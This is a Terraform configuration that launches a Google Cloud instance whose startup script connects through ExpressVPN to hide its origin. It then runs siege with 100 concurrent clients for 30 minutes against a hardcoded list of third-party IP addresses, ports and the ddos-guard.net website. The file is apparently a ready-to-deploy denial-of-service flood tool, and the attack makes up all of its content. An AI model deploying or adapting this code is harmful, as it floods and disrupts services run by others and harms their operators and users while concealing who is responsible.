resource "google_compute_instance" "core" {
  count = 1

  project = var.project_id
  name = "core-${count.index}"
  machine_type = "g1-small"
  zone = "us-central1-a"

  tags = ["default-allow-ssh"]

  boot_disk {
    initialize_params {
      image = "projects/ubuntu-os-cloud/global/images/ubuntu-minimal-2004-focal-v20220203"
    }
  }

  network_interface {
    network = "default"
    access_config {}
  }

  scheduling {
      preemptible = true
      automatic_restart = false
  }

  metadata_startup_script = <<EOT
apt-get update
sudo apt-get install -y --no-install-recommends \
    libterm-readkey-perl ca-certificates wget expect iproute2 curl procps libnm0 \
    ca-certificates \
    curl \
    gnupg \
    lsb-release \
    openssh-server \
    siege
ulimit -n 30000
ulimit -n 30000


cat <<EOF >> ./url.txt
195.218.193.151
87.245.150.33
62.117.96.157:264
188.126.62.6:123
188.126.62.6:1723
188.126.62.6:32400
https://ddos-guard.net/en
EOF

wget -q "https://www.expressvpn.works/clients/linux/expressvpn_3.18.1.0-1_amd64.deb" -O /tmp/expressvpn_3.18.1.0-1_amd64.deb
dpkg -i /tmp/expressvpn_3.18.1.0-1_amd64.deb \
    && rm -rf /tmp/*.deb \
    && apt-get purge -y --auto-remove wget

cat <<EOF >> ./activate.sh
#!/usr/bin/expect
spawn expressvpn activate
expect "code:"
send "${var.expressvpn_key}\r"
expect "information."
send "n\r"
expect eof
EOF

chmod +x ./activate.sh && ./activate.sh

expressvpn preferences set send_diagnostics false
expressvpn preferences set auto_connect true
expressvpn connect "${var.vpn_location}"

sleep 10

echo "IP HERE-> $(curl -v ifconfig.me)"

sudo siege -c 100 -t 30m -f ./url.txt

EOT
}